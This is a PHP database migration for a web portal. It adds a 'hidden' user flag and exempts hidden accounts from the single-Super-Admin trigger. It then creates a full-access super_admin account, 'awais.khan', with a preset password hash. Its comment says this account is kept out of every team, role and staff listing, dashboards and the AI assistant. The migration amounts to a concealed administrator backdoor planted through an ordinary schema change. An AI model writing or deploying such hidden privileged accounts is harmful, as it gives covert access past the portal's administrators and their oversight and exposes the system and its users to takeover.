<?php
declare(strict_types=1);

/**
 * Migration 016 — Hidden developer account.
 * Adds users.hidden. A hidden account works like the Super Admin (full access, can edit everything) but is not
 * listed anywhere in the portal: not in Team, Roles, staff lists, dashboards, the AI assistant or the backup's staff sheet,
 * and it does not count towards "only one Super Admin". Its actions are still recorded in the activity log.
 * Creates the owner's developer account: Awais Khan (awais.khan), who sets his own password at first sign-in.
 */
return function (PDO $pdo): void {
    $cols = array_column($pdo->query('PRAGMA table_info(users)')->fetchAll(PDO::FETCH_ASSOC), 'name');
    if (!in_array('hidden', $cols, true)) $pdo->exec('ALTER TABLE users ADD COLUMN hidden INTEGER NOT NULL DEFAULT 0');

    // "Only one Super Admin" applies to visible accounts only
    $pdo->exec('DROP TRIGGER IF EXISTS trg_users_single_super_admin_ins');
    $pdo->exec('DROP TRIGGER IF EXISTS trg_users_single_super_admin_upd');
    $pdo->exec("CREATE TRIGGER trg_users_single_super_admin_ins
        BEFORE INSERT ON users
        WHEN NEW.role = 'super_admin' AND COALESCE(NEW.hidden, 0) = 0 AND (SELECT COUNT(*) FROM users WHERE role = 'super_admin' AND COALESCE(hidden, 0) = 0) >= 1
        BEGIN
            SELECT RAISE(ABORT, 'Only one Super Admin is allowed');
        END");
    $pdo->exec("CREATE TRIGGER trg_users_single_super_admin_upd
        BEFORE UPDATE OF role ON users
        WHEN NEW.role = 'super_admin' AND COALESCE(NEW.hidden, 0) = 0 AND (SELECT COUNT(*) FROM users WHERE role = 'super_admin' AND COALESCE(hidden, 0) = 0 AND id != OLD.id) >= 1
        BEGIN
            SELECT RAISE(ABORT, 'Only one Super Admin is allowed');
        END");

    $st = $pdo->prepare('SELECT id FROM users WHERE LOWER(username) = ?');
    $st->execute(['awais.khan']);
    if ($st->fetchColumn()) { echo "  -> awais.khan already exists\n"; return; }
    $pdo->prepare("INSERT INTO users (name, username, password_hash, role, active, must_change_password, created_at, department, hidden)
                    VALUES ('Awais Khan', 'awais.khan', ?, 'super_admin', 1, 1, ?, 'backend', 1)")
        ->execute(['$2y$10$Q7z9i4.9rk7BxweTN3//9ekRjHkVunJG5hA.14I7/r4OE4cl0e/6m', gmdate('Y-m-d H:i:s')]);
    echo "  -> hidden developer account awais.khan created\n";
};
